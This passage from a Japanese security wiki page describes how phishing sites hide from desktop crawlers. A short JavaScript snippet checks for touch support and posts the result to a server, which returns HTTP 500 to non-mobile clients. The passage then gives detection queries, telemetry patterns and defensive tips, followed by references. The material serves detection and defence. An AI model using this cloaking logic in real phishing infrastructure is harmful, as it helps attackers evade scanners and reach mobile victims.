運用者は、desktop crawler が最終ページに到達できないよう、単純なデバイスチェックで phishing フローを gate するケースを増やしています。一般的なパターンでは、touch に対応した DOM かどうかを小さな script でテストし、その結果を server endpoint に POST します。non‑mobile client には HTTP 500（または空白のページ）を返し、mobile user には完全なフローを提供します。<sup>[[7]](#references)</sup>

最小限の client snippet（典型的なロジック）：
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` のロジック（簡略化）:
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
サーバーでよく観測される挙動:
- 初回ロード時にセッション cookie を設定する。
- `POST /detect {"is_mobile":true|false}` を受け付ける。
- `is_mobile=false` の場合、後続の GET に対して 500（またはプレースホルダー）を返し、`true` の場合にのみ phishing を提供する。

探索および検知のヒューリスティック:
- urlscan クエリ: `filename:"detect_device.js" AND page.status:500`
- Web テレメトリ: `GET /static/detect_device.js` → `POST /detect` → 非モバイルの場合は HTTP 500 というシーケンス。正規のモバイル被害者パスでは、後続の HTML/JS を伴って 200 が返る。
- `ontouchstart` や類似のデバイスチェックだけを条件にコンテンツを提供するページをブロックするか、詳しく調査する。

防御のヒント:
- モバイルに似たフィンガープリントと JS を有効にした状態で crawler を実行し、ゲートされたコンテンツを明らかにする。
- 新たに登録されたドメインで、`POST /detect` に続いて不審な 500 応答が発生した場合にアラートを出す。

## References

- [1] [Phishing で使用されるドメインのバリエーション生成（Zeltser）](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing の発見: ツールとテクニック（0xPatrik）](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC を使用して認証情報を窃取し、2FA をバイパスする（mr.d0x）](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC でセッションを窃取し、2FA をバイパスする（darkbyte.net）](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy 上で Postfix に DKIM をインストールして設定する方法（DigitalOcean）](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – モバイルゲート型 phishing インフラとヒューリスティック（Sekoia.io）](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [ランタイムアセンブリ攻撃の次なるフロンティア: LLM を活用したリアルタイムの phishing JavaScript 生成](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [なりすまし、クリックハイジャック、TDS: マルウェア配布エコシステムの内部](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com の Bitsquatting（Remy Hax）](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [ビット反転による Microsoft の windows.com へのトラフィックハイジャック（BleepingComputer）](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: パキスタンを標的とした spyware キャンペーンの誘い文句に使われた偽の dating app](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat の IoC とサンプル](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
